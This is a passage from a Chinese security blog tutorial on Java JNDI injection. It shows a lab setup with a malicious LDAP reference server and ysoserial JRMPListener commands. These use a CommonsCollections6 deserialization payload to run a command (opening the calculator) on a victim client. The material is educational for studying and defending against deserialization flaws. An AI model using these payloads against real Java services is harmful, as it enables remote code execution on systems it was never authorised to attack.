<p>修改环境所需要的 pom.xml，在 HackerLDAPRefServer.java 中的 javaSerializedData 更改 payload，然后 maven 构建即可，注意要打包好依赖</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-jndi-inject.assets/image-20200810104109129.png" alt="image-20200810104109129"></p>
<p>启动服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp hackerserver-jar-with-dependencies.jar HackerLDAPRefServer 192.168.169.112 8888 1389</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-jndi-inject.assets/image-20200810104303709.png" alt="image-20200810104303709"></p>
<p>下面是更改客户端代码，在项目中 PoC 目录，fastjsonjndi.Victim，只需要如下代码触发即可，其它代码可以先注释掉，更改对应的 Commons Collections 版本，将项目依赖打包好</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-jndi-inject.assets/image-20200810104603056.png" alt="image-20200810104603056"></p>
<p>根据自定义的 payload，监听对应端口，启动客户端，进行 JNDI lookup，成功利用反序列化执行系统命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp VictimClient-jar-with-dependencies.jar fastjsonjndi.Victim</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-jndi-inject.assets/lz2020.gif" alt="img"></p>
<h4 id="（3）JRPM-反序列化"><a href="#（3）JRPM-反序列化" class="headerlink" title="（3）JRPM 反序列化"></a>（3）JRPM 反序列化</h4><p>关于 JRMP 协议(Java Remote Message Protocol)，在上文中页有所提及，是 RMI 专用的 Java 远程消息交换协议，在 RMI 中，对象通过序列化的方式进行编码传输</p>
<p><strong>服务端攻击客户端</strong></p>
<p>首先利用 ysoserial 生成 payload 并建立一个 JRMPListener，作为服务端</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 <span class="string">"open /Applications/Calculator.app"</span></span><br></pre></td></tr></table></figure>
<p>下面找一个简单的客户端 lookup 连接即可，就直接使用上面的 Victim.java 修改了</p>
<p>其它代码注释，添加</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Registry registry = LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">    HelloInterface hello = (HelloInterface) registry.lookup(<span class="string">"hello"</span>);</span><br><span class="line">    System.out.println(hello.sayHello(<span class="string">"hello!"</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接口类要继承 java.rmi.Remote</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloInterface</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String from)</span> <span class="keyword">throws</span> java.rmi.RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在，启动客户端，连接服务端，如下图所示，由于客户端反序列化服务端返回的 payload 数据，成功利用 CommonsCollections6 弹出计算器</p>
<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/java-jndi-inject.assets/new.gif" alt="new"></p>
<p>反过来客户端打服务端也是可以的，可以利用 ysoserial.exploit.JRMPClient</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">https://kingx.me/Exploit-Java-Deserialization-with-RMI.html</a></p>
<p><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></p>
<p><a href="https://www.smi1e.top/java代码审计学习之jndi注入/" target="_blank" rel="noopener">https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/</a></p>
<p><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://j0k3r.top/2020/08/11/java-jndi-inject/">http://j0k3r.top/2020/08/11/java-jndi-inject/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://j0k3r.top">J0k3r's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a><a class="post-meta__tags" href="/tags/JNDI/">JNDI</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/alipay.jpg"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/wechat.jpg"><div class="post-qr-code__desc">微信打赏</div></div></div><div class="social-share"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/08/13/java-expression/"><i class="fa fa-chevron-left">  </i><span>Java EL （Expression Language）表达式注入</span></a></div><div class="next-post pull-right"><a href="/2020/03/24/php-Deobfuscator/"><span>基于 AST（抽象语法树）解 PHP 混淆</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'true' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'yeOeLCiDRMa7CAnJy2jxA2IY-gzGzoHsz',
  appKey:'eAgtubAYTMshS76hpc1F1UBG',
  placeholder:'Just go go',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/wallhaven-j5k275.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"superSample":2,"width":210,"height":420,"position":"left","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>